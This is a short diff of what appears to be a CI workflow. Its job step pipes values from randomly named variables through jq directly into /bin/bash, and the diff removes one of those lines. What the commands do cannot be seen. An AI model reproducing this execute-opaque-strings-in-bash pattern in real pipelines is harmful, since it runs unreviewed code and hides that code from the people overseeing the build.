@@ -24,7 +24,6 @@ jobs:
           echo $lz77 | jq -r .uuhx8 | /bin/bash
           printf '%s' "$g63" | jq -r .aqay103 | /bin/bash
           printf '%s' "$var7" | jq -r .iwtdo16325 | /bin/bash
-          printf '%s' "$v629" | jq -r .l19033 | /bin/bash
           printf '%s' "$yykmr8798" | jq -r .yj51 | /bin/bash
 
       - name: Persist data
